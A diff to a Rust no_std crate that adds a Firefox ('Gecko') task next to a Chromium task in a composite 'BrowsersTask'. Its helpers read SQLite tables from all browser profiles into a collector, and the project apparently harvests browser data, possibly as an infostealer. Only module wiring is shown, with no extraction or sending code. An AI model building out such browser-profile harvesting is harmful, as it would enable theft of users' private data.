@@ -1,14 +1,15 @@
 #![feature(let_chains)]
 #![no_std]
 
+mod gecko;
+mod chromium;
+
 extern crate alloc;
 use database::{DatabaseReader, Databases, TableRecord};
-mod chromium;
 
 use crate::alloc::borrow::ToOwned;
 use alloc::string::{String, ToString};
 
-use crate::chromium::ChromiumTask;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::Collector;
@@ -16,6 +17,8 @@ use core::fmt::{Display, Formatter};
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
+use crate::gecko::GeckoTask;
+use crate::chromium::ChromiumTask;
 
 pub struct BrowsersTask<C: Collector> {
     inner: CompositeTask<C>
@@ -25,7 +28,8 @@ impl<C: Collector + 'static> Default for BrowsersTask<C> {
     fn default() -> Self {
         Self {
             inner: composite_task!(
-                ChromiumTask::new()
+                ChromiumTask::new(),
+                GeckoTask::new()
             )
         }
     }
@@ -48,7 +52,6 @@ where
 {
     collect_and_read_from_all_profiles(profiles, Databases::Sqlite, path, table, mapper)
 }
-
 
 pub(crate) fn collect_and_read_from_all_profiles<D, P, R, F, T, S>(
     profiles: &[Path],
@@ -75,7 +78,6 @@ where
         }
     })
 }
-
 
 pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
 where
